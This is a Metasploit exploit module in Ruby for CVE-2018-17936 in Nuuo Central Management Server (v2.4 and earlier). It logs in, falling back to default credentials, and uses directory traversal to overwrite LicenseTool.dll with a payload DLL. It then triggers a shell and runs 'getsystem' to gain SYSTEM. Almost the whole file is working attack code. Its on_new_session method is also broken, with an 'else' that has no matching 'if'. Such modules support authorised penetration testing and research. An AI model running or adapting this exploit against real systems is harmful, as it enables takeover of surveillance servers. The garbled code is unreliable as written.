# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::Nuuo

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Nuuo Central Management Server Authenticated Arbitrary File Upload",
      &#039;Description&#039;    => %q{
      The COMMITCONFIG verb is used by a CMS client to upload and modify the configuration of the
      CMS Server.
      The vulnerability is in the "FileName" parameter, which accepts directory traversal (..\\..\\)
      characters. Therefore, this function can be abused to overwrite any files in the installation
      drive of CMS Server.

      This vulnerability is exploitable in CMS versions up to and including v2.4.

      This module will either use a provided session number (which can be guessed with an auxiliary
      module) or attempt to login using a provided username and password - it will also try the
      default credentials if nothing is provided.

      This module will overwrite the LicenseTool.dll file in the CMS Server installation. If the module
      fails to restore LicenseTool.dll then the installation will be corrupted and NCS Server will
      not execute successfully.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Pedro Ribeiro <pedrib@gmail.com>&#039;         # Vulnerability discovery and Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2018-17936&#039; ],
          [ &#039;URL&#039;, &#039;https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02&#039; ],
          [ &#039;URL&#039;, &#039;https://seclists.org/fulldisclosure/2019/Jan/51&#039; ],
          [ &#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/advisories/nuuo-cms-ownage.txt&#039; ]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Targets&#039;        =>
        [
          [ &#039;Nuuo Central Management Server <= v2.4.0&#039;, {} ],
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Oct 11 2018&#039;,
      &#039;DefaultTarget&#039;  => 0))
  end

  def on_new_session(client)
      print_warning(&#039;Please wait a bit while we clean up&#039;)
      client.sys.process.get_processes().each do |proc|
        if proc[&#039;name&#039;] == &#039;NCS_Server.exe&#039;
          client.sys.process.kill(proc[&#039;pid&#039;])
          Rex.sleep(5)
          client.shell_command_token("move /y #{@dll} LicenseTool.dll")
          client.sys.process.execute(&#039;NCS_Server.exe&#039;)
          print_good(&#039;Successfully restored LicenseTool.dll!&#039;)
        end
      end

      # elevate privs to system (we&#039;re already Admin anyway), and we&#039;re done!
      client.run_cmd(&#039;getsystem&#039;)
      print_good(&#039;We should have SYSTEM now, enjoy your shell!&#039;)
    else
      print_error("To restore it, kill the NCS_Server.exe process and copy <CMS_FOLDER>\\#{@dll} to <CMS_FOLDER>\\LicenseTool.dll")
      print_error(&#039;... otherwise the Nuuo CMS installation will be nuked!&#039;)
      print_good(&#039;Anyway, enjoy your shell!&#039;)
    end
  end

  def exploit
    nucs_login

    unless @nucs_session
      fail_with(Failure::NoAccess, &#039;Failed to login to Nuuo CMS&#039;)
    end

    # Download and upload a backup of LicenseTool.dll, so that we can restore it at post
    # and not nuke the CMS installation.
    @dll = rand_text_alpha(12)
    print_status("Backing up LicenseTool.dll to #{@dll}")
    dll_data = nucs_download_file(&#039;LicenseTool.dll&#039;)
    nucs_upload_file(@dll, dll_data)

    print_status(&#039;Uploading payload...&#039;)
    nucs_upload_file(&#039;LicenseTool.dll&#039;, generate_payload_dll)

    print_status(&#039;Sleeping 15 seconds...&#039;)
    Rex.sleep(15)

    print_status(&#039;Sending SENDLICFILE request, shell incoming!&#039;)
    license_data = rand_text_alpha(50..350)
    nucs_send_msg([&#039;SENDLICFILE&#039;, "FileName: #{rand_text_alpha(3..11)}.lic",
      &#039;Content-Length: &#039; + license_data.length.to_s], license_data)
  end
end

